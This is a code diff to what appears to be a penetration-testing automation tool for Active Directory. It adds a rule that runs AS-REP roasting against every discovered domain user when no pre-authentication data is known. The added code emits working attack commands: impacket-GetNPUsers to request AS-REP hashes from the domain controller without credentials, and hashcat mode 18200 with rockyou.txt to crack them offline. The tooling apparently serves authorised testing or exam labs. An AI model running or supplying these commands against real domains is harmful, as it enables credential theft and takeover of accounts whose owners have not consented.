@@ -636,6 +636,27 @@ def run(report, store, ui=None):
                       f"impacket-GetNPUsers {dom}/ -usersfile asrep_users.txt "
                       f"-dc-ip {dc()} -no-pass -request -format hashcat | tee asrep.txt",
                       "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
+    # iter-131: R11-BLIND - when we have a users list from lookupsid /
+    # enum4linux / nxc --rid-brute but no BH markers to tell us WHICH users
+    # have DONT_REQ_PREAUTH set, try them all. Each user takes one AS_REQ;
+    # only DONT_REQ_PREAUTH users emit a crackable hash, others return
+    # KDC_ERR_PREAUTH_REQUIRED. Exam-legal (unauthenticated Kerberos AS_REQ,
+    # no relay, no spray). Score is moderate - conf 0.5 because most domains
+    # have zero AS-REPRoastable users.
+    _users_for_asrep = {u for u in e.users
+                        if u and not u.endswith("$") and "_history" not in u.lower()
+                        and u.lower() not in ("krbtgt", "guest")}
+    _users_for_asrep -= {u.lower() for u in e.asreproastable}   # dedup with R11 loop
+    if _users_for_asrep and not e.asreproastable:
+        chains.append(Chain("R11-BLIND", "AS-REP roast (all users)",
+            f"try AS-REP against every discovered user ({len(_users_for_asrep)})",
+            crit=5, conf=0.5, ready=0.7, prox=max(0.7, _prox(store, dc())),
+            commands=[f"impacket-GetNPUsers {dom}/ -usersfile users.txt "
+                      f"-dc-ip {dc()} -no-pass -request -format hashcat "
+                      f"| tee asrep.txt   "
+                      f"# DONT_REQ_PREAUTH users emit hashes; others: KDC_ERR_PREAUTH_REQUIRED",
+                      "hashcat -m 18200 asrep.txt rockyou.txt"],
+            src="users.txt"))
     if e.has_asrep:
         s, l = e.asrep_src
         # iter-80: same path threading for the AS-REP cracker.
